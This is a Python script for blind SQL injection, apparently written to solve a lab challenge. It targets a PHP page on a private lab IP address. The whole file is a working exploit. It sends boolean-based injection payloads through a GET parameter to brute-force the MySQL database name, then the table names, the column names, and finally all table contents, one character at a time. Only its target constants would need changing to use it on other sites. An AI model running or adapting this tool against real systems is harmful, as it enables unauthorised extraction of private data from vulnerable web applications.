#Blind SQL Injection Tool for ethical penetration testing
#Created to solve an immersive labs challenge
#Hamish Starling
#Built specifically for MySQL but could be adapted

import requests

def makeRequest(toInject):
	"""Returns boolean: True if the request led to success, False is the request led to failure"""
	return SUCCESS_INDICATOR in requests.get("http://"+TARGET_IP+"/"+PAGE_NAME,params={GET_PARAM_NAME:toInject}).text

TARGET_IP = "10.102.10.229"
GET_PARAM_NAME = "secret"
PAGE_NAME = "dbstatus.php"
SUCCESS_INDICATOR = "Database connection"
ALPHABET = "abc,defghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"
MAX_DB_LENGTH = 30
MAX_TABLE_NAME_LENGTH = 200
MAX_COLUMN_NAME_LENGTH = 200

#Brute force the length of the name of the database using boolean blind SQLi
for i in range(MAX_DB_LENGTH):
	if (makeRequest("' OR LENGTH(DATABASE())='"+str(i))):
		break
print("Name of database has length: "+str(i))

#Brute force the name of the database using boolean blind SQLi
dbName = ""
for j in range(i+1):
	for char in ALPHABET:
		query = "' OR SUBSTR(DATABASE(),"+str(j)+",1) ='"+char
		if makeRequest(query):
			dbName = dbName + char
			break
print("Database is called: "+dbName)

#Brute force the length of all of the table names joined together using boolean blind SQLi
for i in range(MAX_TABLE_NAME_LENGTH):
	query = "' OR (SELECT LENGTH(GROUP_CONCAT(table_name SEPARATOR ',')) FROM information_schema.tables WHERE table_schema='" + dbName + "') = '"+str(i)
	if (makeRequest(query)):
		break
print("Length of all table names is: " + str(i))

#Brute force all of the table names in the current database joined together using boolean blind SQLi 
tableNames = ""
for j in range(i+1):
	for char in ALPHABET:
		query = "' OR SUBSTR((SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='" + dbName + "'),"+str(j)+",1) ='"+char
		if makeRequest(query):
			tableNames = tableNames + char
			break
print("Tables are called: "+tableNames)

#Get the actual data out of each table in the current database
tables = tableNames.split(",")
for tableName in tables: #for all tables
	#Get length of all columns in this table
	for i in range(MAX_COLUMN_NAME_LENGTH):
		query = "' OR (SELECT LENGTH(GROUP_CONCAT(COLUMN_NAME SEPARATOR ',')) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='" + dbName + "' AND TABLE_NAME='"+tableName+"') = '"+str(i)
		if (makeRequest(query)):
			break
	print("Total length of column names in table "+tableName+" is " + str(i))

	#Get all column names in this table
	allCols = ""
	for j in range(i+1):
		for char in ALPHABET:
			query = "' OR SUBSTR((SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ',') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='" + dbName + "' AND TABLE_NAME='"+tableName+"'),"+str(j)+",1) ='"+char
			if makeRequest(query):
				allCols = allCols + char
				break
	print("The columns are called: "+allCols)

	#Now get all column data from each table, starting with the length and then the actual data
	cols = allCols.split(",")
	for col in cols:
		for i in range(200):
			query = "' OR (SELECT LENGTH(GROUP_CONCAT("+col+" SEPARATOR ',')) FROM "+tableName+") = '"+str(i)
			if (makeRequest(query)):
				break
		print("Total length of column data in "+ col +" is " + str(i))	

		columnData = ""
		for j in range(i+1):
			for char in ALPHABET:
				query = "' OR SUBSTR((SELECT GROUP_CONCAT("+col+" SEPARATOR ',') FROM "+tableName+"),"+str(j)+",1) ='"+char
				if makeRequest(query):
					columnData = columnData + char
					break
		print("The data in column "+col+" is: "+columnData)
	print("\n") #Newline to separate data for each table